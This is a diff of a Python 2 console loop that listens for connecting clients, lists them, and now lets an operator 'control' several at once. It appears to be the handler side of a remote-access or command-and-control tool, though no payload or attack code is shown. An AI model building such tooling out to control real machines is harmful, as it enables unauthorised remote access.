@@ -18,35 +18,40 @@ if __name__ == "__main__":
         while True:
             cmd = raw_input('>')
             if cmd == "listen":
-                listener_thread = threading.Thread(target=server.listen())
+                listener_thread = threading.Thread(target=server.listen(persist=True))
                 listener_thread.start()
             if cmd == "stop":
                 listener_thread.stop()
             if cmd == "list":
-                for i,c in enumerate(server.CLIENTS):
-                    print "{}. {}".format(i+1, c['addr'])
+                if server.CLIENTS == []:
+                    print "[*]   There are no clients connected. Use 'listen' to collect clients."
+                else:
+                    for i,c in enumerate(server.CLIENTS):
+                        print "{}. {}".format(i+1, c['addr'])
             if cmd == "control":
-                print "[?] Which client?"
+                print "[?]   Which clients? (1 2 ...)"
                 for i,c in enumerate(server.CLIENTS):
                     print "{}. {}".format(i+1, c['addr'])
 
                 cmd = raw_input()
 
-                client_socket = None
+                # client_socket = None
                 try:
+                    indices = [int(i) for i in cmd.split(' ')]
+                    sockets = []
                     for i,c in enumerate(server.CLIENTS):
-                        if i + 1 == int(cmd):
-                            client_socket = c
-                            server.control_client(c)
-                            break
-                except IOError as e:
-                    print "[!!] Unable to connect to client."
-                    print "[!!] Removing client from list."
-                    server.CLIENTS.remove(client_socket)
+                        if i + 1 in indices:
+                            sockets.append(c)
+                    server.control_clients(sockets)
+                # except IOError as e:
+                #     print "[!!]  Unable to connect to client."
+                #     print "[!!]  Removing client from list."
+                #     server.CLIENTS.remove(client_socket)
                 except Exception as e:
-                    print "[!!] Unable to use this client."
+                    print "[!!]  Unable to use these clients."
+                    print "[!!]  " + str(e)
 
 
     except KeyboardInterrupt:
-        print "[*] Closing connection..."
+        print "[*]   Closing connection..."
         server.server.close()
